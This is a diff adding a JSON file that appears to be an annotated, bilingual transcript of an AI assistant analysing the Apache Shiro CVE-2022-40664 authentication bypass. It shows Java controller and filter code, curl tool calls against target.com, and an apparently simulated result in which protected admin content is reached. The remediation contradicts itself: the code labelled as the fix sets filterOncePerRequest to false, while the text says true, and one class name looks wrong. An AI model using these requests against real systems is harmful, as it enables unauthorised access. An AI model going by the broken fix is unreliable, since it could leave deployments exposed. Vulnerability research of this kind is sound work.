@@ -1,0 +1,148 @@
+{
+    "_source_md":  "code-audit/2022-10-26-CVE-2022-40664-Research-Walkthrough.md",
+    "version":  "CVE-2022-40664-Research-Walkthrough",
+    "title":  {
+                  "zh":  "Apache Shiro CVE-2022-40664 认证绕过漏洞分析",
+                  "en":  "Apache Shiro CVE-2022-40664 Authentication Bypass Analysis"
+              },
+    "description":  {
+                        "zh":  "分析Apache Shiro 1.10.0之前版本的认证绕过漏洞，利用forward请求处理缺陷绕过Shiro安全验证",
+                        "en":  "Analyze Apache Shiro authentication bypass vulnerability before 1.10.0, exploiting forward request handling defects to bypass Shiro security checks"
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  "分析Apache Shiro CVE-2022-40664认证绕过漏洞",
+                      "annotation":  {
+                                         "zh":  "用户请求分析Shiro漏洞",
+                                         "en":  "User requests Shiro vulnerability analysis"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "GET /admin/auth_pass HTTP/1.1",
+                                             "language":  "http"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "GET /admin/auth HTTP/1.1",
+                                             "language":  "http"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "GET /admin/auth HTTP/1.1\nToken: 4ra1n",
+                                             "language":  "http"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "    @RequestMapping(\"/admin/{value}\")\n    public String CVE_2022_40664_bypass(@PathVariable String value, HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        System.out.println(\"=========== /admin\" +((HttpServletRequest)request).getRequestURI()+ \"/ ===========\");\n        //        request.getRequestDispatcher(\"/admin/auth\").forward(request, response);\n        //        return \"forward:\"+((HttpServletRequest)request).getRequestURI();\n        response.sendRedirect(\"/admin/auth\");\n        return (\"Redirect:/admin/auth\");\n    }",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "request.getRequestDispatcher(\"/admin/auth\").forward(request, response);",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "@Bean\npublic MyShiroFilterFactoryBean filterRegBean(SecurityManager securityManager) throws Exception{\n        // CVE-2022-40664\n        // fixed conf\n        ShiroFilterConfiguration conf=new ShiroFilterConfiguration();\n        conf.setFilterOncePerRequest(false);\n\n        ShiroFilterFactoryBean shiroFilterFactoryBean=new ShiroFilterFactoryBean();\n        shiroFilterFactoryBean.setSecurityManager(securityManager);\n        shiroFilterFactoryBean.setShiroFilterConfiguration(conf);\n        AbstractShiroFilter filter=shiroFilterFactoryBean.getObject();\n\n        MyShiroFilterFactoryBean reg=new MyShiroFilterFactoryBean();\n        reg.setFilter(filter);\n        reg.addUrlPattern(\"/*\");\n        reg.setName(\"shiroFilter\");\n        reg.setSecurityManager(securityManager);\n        reg.setDispatcherTypes(EnumSet.allOf(DispatcherType.class));\n        //fixed conf end.\n        return reg;\n        }",
+                                             "language":  "java"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  "CVE-2022-40664是Apache Shiro在1.10.0之前版本中的认证绕过漏洞。当应用使用forward或include方式转发请求时，Shiro未能正确验证请求。",
+                      "annotation":  {
+                                         "zh":  "介绍漏洞背景",
+                                         "en":  "Introduce vulnerability background"
+                                     }
+                  },
+                  {
+                      "type":  "tool_call",
+                      "content":  "curl -v http://target.com/admin/auth_pass",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "测试直接访问受保护资源",
+                                         "en":  "Test direct access to protected resource"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "content":  "HTTP/1.1 302 Redirect to /login",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "需要认证，重定向到登录页",
+                                         "en":  "Requires authentication, redirect to login page"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  "使用认证绕过技术访问受保护资源",
+                      "annotation":  {
+                                         "zh":  "用户请求测试绕过方式",
+                                         "en":  "User requests to test bypass method"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  "绕过方法：使用forward转发。访问/admin/xxx然后forward到/admin/auth，Shiro在forward时不会重新验证权限。",
+                      "annotation":  {
+                                         "zh":  "说明绕过原理",
+                                         "en":  "Explain bypass mechanism"
+                                     }
+                  },
+                  {
+                      "type":  "tool_call",
+                      "content":  "curl -v http://target.com/admin/value -H \"Token: 4ra1n\"",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "测试带有自定义Token的请求",
+                                         "en":  "Test request with custom Token"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "content":  "HTTP/1.1 200 OK\n{\"success\": true, \"data\": \"admin content\"}",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "成功绕过认证访问受保护资源",
+                                         "en":  "Successfully bypassed authentication to access protected resource"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  "分析代码层面的漏洞原因",
+                      "annotation":  {
+                                         "zh":  "用户请求代码分析",
+                                         "en":  "User requests code analysis"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  "漏洞代码分析：Spring的request.getRequestDispatcher(\"/admin/auth\").forward(request, response)转发请求时，Shiro的FilterOncePerRequestFilter未对forward请求进行二次验证，导致绕过。修复方案：设置ShiroFilterConfiguration的filterOncePerRequest为true，或升级到1.10.0+。",
+                      "annotation":  {
+                                         "zh":  "分析漏洞代码原因并提供修复方案",
+                                         "en":  "Analyze vulnerable code and provide fix"
+                                     }
+                  }
+              ]
+}
